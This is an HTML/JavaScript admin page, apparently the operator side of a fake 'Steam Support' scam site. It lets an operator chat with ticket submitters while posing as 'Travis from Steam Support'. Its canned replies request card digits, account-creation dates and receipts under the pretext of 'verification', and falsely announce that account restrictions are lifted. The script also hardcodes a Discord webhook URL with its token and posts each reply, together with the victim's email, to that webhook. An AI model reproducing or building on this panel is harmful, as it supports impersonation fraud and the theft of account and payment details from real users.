<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Support Admin Panel</title>
    <style>
        /* (Все стили из предыдущей версии сохраняются) */
        /* Добавляем только новые стили для чата */
        
        .admin-chat-container {
            display: flex;
            flex-direction: column;
            height: 600px;
            border: 1px solid #2a475e;
            border-radius: 6px;
            overflow: hidden;
        }
        
        .admin-chat-header {
            background: #171a21;
            padding: 15px;
            border-bottom: 1px solid #2a475e;
        }
        
        .admin-chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            background: rgba(0,0,0,0.1);
        }
        
        .admin-chat-input-area {
            padding: 15px;
            border-top: 1px solid #2a475e;
            background: #171a21;
        }
        
        .admin-message {
            margin-bottom: 15px;
            max-width: 70%;
        }
        
        .admin-message.support {
            margin-left: auto;
            background: rgba(92, 126, 16, 0.3);
            border-left: 3px solid #5c7e10;
        }
        
        .admin-message.user {
            margin-right: auto;
            background: rgba(42, 71, 94, 0.3);
            border-right: 3px solid #2a475e;
        }
        
        .admin-message.system {
            margin: 10px auto;
            background: rgba(255, 184, 32, 0.1);
            border: 1px dashed #ffb820;
            max-width: 90%;
            text-align: center;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Весь предыдущий код admin.html остается -->
    <!-- Добавляем только модальное окно с чатом -->
    
    <!-- Chat Modal -->
    <div id="chatModal" class="modal-overlay" style="display: none;">
        <div class="modal-content" style="max-width: 700px;">
            <div class="modal-header">
                <h3 id="chatModalTitle">Chat with User</h3>
                <span class="close-modal" onclick="closeChatModal()">&times;</span>
            </div>
            <div class="modal-body">
                <div class="admin-chat-container">
                    <div class="admin-chat-header">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong id="chatUserEmail">user@example.com</strong>
                                <div style="font-size: 12px; color: #8f98a0;">
                                    Ticket: <span id="chatTicketId">S-0000000</span> | 
                                    Status: <span id="chatTicketStatus">pending</span>
                                </div>
                            </div>
                            <div>
                                <select id="chatStatusSelect" style="padding: 5px; background: rgba(0,0,0,0.3); color: white; border: 1px solid #2a475e; border-radius: 3px;">
                                    <option value="pending">Pending</option>
                                    <option value="reviewed">Under Review</option>
                                    <option value="resolved">Resolved</option>
                                </select>
                                <button onclick="updateChatStatus()" style="margin-left: 10px; padding: 5px 10px; background: #2a475e; color: white; border: none; border-radius: 3px; cursor: pointer;">
                                    Update
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="admin-chat-messages" id="adminChatMessages">
                        <!-- Chat messages will appear here -->
                    </div>
                    
                    <div class="admin-chat-input-area">
                        <div style="display: flex; gap: 10px;">
                            <textarea id="adminChatInput" style="flex: 1; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; height: 80px; resize: none;" placeholder="Type your response as Travis from Steam Support..."></textarea>
                            <div style="display: flex; flex-direction: column; gap: 5px;">
                                <button onclick="sendAdminMessage()" style="padding: 10px 20px; background: #66c0f4; color: white; border: none; border-radius: 4px; cursor: pointer;">
                                    <i class="fas fa-paper-plane"></i> Send
                                </button>
                                <button onclick="sendTemplateResponse()" style="padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
                                    <i class="fas fa-reply"></i> Template
                                </button>
                            </div>
                        </div>
                        <div style="margin-top: 10px; display: flex; gap: 5px; flex-wrap: wrap;">
                            <button onclick="insertTemplate('Hi there,\n\nThank you for contacting Steam Support.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
                                Greeting
                            </button>
                            <button onclick="insertTemplate('We are currently reviewing your verification request.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
                                Reviewing
                            </button>
                            <button onclick="insertTemplate('Please provide additional information about your issue.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
                                More Info
                            </button>
                            <button onclick="insertTemplate('Your ticket has been resolved. Thank you for contacting Steam Support.\n\nTravis')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
                                Resolved
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Добавляем функции для работы с чатом в админке
        
        let currentChatTicket = null;
        
        function openChat(ticketId) {
            // Найти тикет
            const ticket = currentTickets.find(t => t.id === ticketId);
            if (!ticket) {
                alert('Ticket not found');
                return;
            }
            
            currentChatTicket = ticket;
            
            // Заполнить информацию
            document.getElementById('chatUserEmail').textContent = ticket.email;
            document.getElementById('chatTicketId').textContent = ticket.id;
            document.getElementById('chatTicketStatus').textContent = ticket.status;
            document.getElementById('chatModalTitle').textContent = `Chat: ${ticket.email}`;
            document.getElementById('chatStatusSelect').value = ticket.status;
            
            // Показать сообщения
            displayAdminChatMessages(ticket.messages || []);
            
            // Показать модальное окно
            document.getElementById('chatModal').style.display = 'flex';
        }
        
        function closeChatModal() {
            document.getElementById('chatModal').style.display = 'none';
            currentChatTicket = null;
        }
        
        function displayAdminChatMessages(messages) {
            const container = document.getElementById('adminChatMessages');
            container.innerHTML = '';
            
            if (!messages || messages.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #8f98a0;">No messages yet</div>';
                return;
            }
            
            messages.forEach(msg => {
                const messageDiv = document.createElement('div');
                
                if (msg.sender === 'system') {
                    messageDiv.className = 'admin-message system';
                    messageDiv.innerHTML = `<div style="padding: 10px; font-size: 12px; color: #ffb820;">${msg.message}</div>`;
                } else {
                    messageDiv.className = `admin-message ${msg.sender === 'user' ? 'user' : 'support'}`;
                    
                    const sender = msg.sender === 'user' ? 'User' : 'Steam Support (You)';
                    const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                    
                    messageDiv.innerHTML = `
                        <div style="padding: 10px;">
                            <div style="font-size: 11px; color: #8f98a0; margin-bottom: 5px;">
                                <strong>${sender}</strong> • ${time}
                            </div>
                            <div style="white-space: pre-wrap; font-size: 13px;">${msg.message}</div>
                        </div>
                    `;
                }
                
                container.appendChild(messageDiv);
            });
            
            // Прокрутить вниз
            container.scrollTop = container.scrollHeight;
        }
        
        async function sendAdminMessage() {
            if (!currentChatTicket) return;
            
            const input = document.getElementById('adminChatInput');
            const message = input.value.trim();
            
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            // Добавить сообщение в тикет
            const newMessage = {
                sender: 'support',
                message: message,
                timestamp: new Date().toISOString()
            };
            
            // Обновить локально
            const ticketIndex = currentTickets.findIndex(t => t.id === currentChatTicket.id);
            if (ticketIndex !== -1) {
                currentTickets[ticketIndex].messages.push(newMessage);
                currentTickets[ticketIndex].updated_at = new Date().toISOString();
                
                // Сохранить в localStorage
                localStorage.setItem('steam_tickets', JSON.stringify(currentTickets));
                
                // Обновить отображение
                displayAdminChatMessages(currentTickets[ticketIndex].messages);
                
                // Очистить поле ввода
                input.value = '';
                
                // Отправить на сервер
                try {
                    await fetch(`${API_SERVER}?action=add_message&ticket_id=${currentChatTicket.id}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            sender: 'support',
                            message: message
                        })
                    });
                    
                    // Отправить Discord уведомление
                    sendDiscordAdminNotification(currentChatTicket, message);
                    
                } catch (error) {
                    console.log('Failed to send to server');
                }
            }
        }
        
        function insertTemplate(template) {
            const input = document.getElementById('adminChatInput');
            input.value = template;
            input.focus();
        }
        
        function sendTemplateResponse() {
            const templates = [
                "Hi there,\n\nThank you for your message. We've received it and will review it shortly.\n\nSteam Support\nTravis",
                "We appreciate your patience. Our team is currently reviewing your verification request and will get back to you soon.",
                "Please provide the following additional information to help us process your request:\n- Last 4 digits of the card used for purchase\n- Approximate date of account creation\n- Any additional receipts you may have",
                "Your verification request has been approved. Your account restrictions have been lifted.\n\nSteam Support\nTravis",
                "We need more time to review your case. Please allow 24-48 hours for our team to complete the verification process."
            ];
            
            const randomTemplate = templates[Math.floor(Math.random() * templates.length)];
            document.getElementById('adminChatInput').value = randomTemplate;
        }
        
        async function updateChatStatus() {
            if (!currentChatTicket) return;
            
            const newStatus = document.getElementById('chatStatusSelect').value;
            
            // Обновить локально
            const ticketIndex = currentTickets.findIndex(t => t.id === currentChatTicket.id);
            if (ticketIndex !== -1) {
                currentTickets[ticketIndex].status = newStatus;
                currentTickets[ticketIndex].updated_at = new Date().toISOString();
                
                // Добавить системное сообщение
                currentTickets[ticketIndex].messages.push({
                    sender: 'system',
                    message: `Ticket status changed to ${newStatus}`,
                    timestamp: new Date().toISOString()
                });
                
                // Сохранить
                localStorage.setItem('steam_tickets', JSON.stringify(currentTickets));
                
                // Обновить отображение
                document.getElementById('chatTicketStatus').textContent = newStatus;
                displayAdminChatMessages(currentTickets[ticketIndex].messages);
                
                // Отправить на сервер
                try {
                    await fetch(`${API_SERVER}?action=update_status&ticket_id=${currentChatTicket.id}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            status: newStatus
                        })
                    });
                } catch (error) {
                    console.log('Failed to update status on server');
                }
            }
        }
        
        function sendDiscordAdminNotification(ticket, message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
            
            const discordMessage = {
                content: `**📨 ADMIN RESPONSE SENT**\n` +
                        `**Ticket:** ${ticket.id}\n` +
                        `**To:** ${ticket.email}\n` +
                        `**Response:** ${message.substring(0, 150)}${message.length > 150 ? '...' : ''}\n` +
                        `**Time:** ${new Date().toLocaleString()}`
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(discordMessage)
            }).catch(() => {});
        }
        
        // Модифицируем функцию openTicket для добавления кнопки чата
        function openTicket(ticketId) {
            // ... существующий код ...
            
            // Добавить кнопку чата в modal
            const ticketDetailsDiv = document.getElementById('ticketDetails');
            const chatButton = document.createElement('button');
            chatButton.innerHTML = '<i class="fas fa-comments"></i> Open Chat';
            chatButton.style.cssText = 'background:#66c0f4; color:white; border:none; padding:8px 15px; border-radius:4px; cursor:pointer; margin-top:10px;';
            chatButton.onclick = function() {
                closeModal();
                setTimeout(() => openChat(ticketId), 300);
            };
            
            ticketDetailsDiv.appendChild(chatButton);
        }
    </script>
</body>
</html>
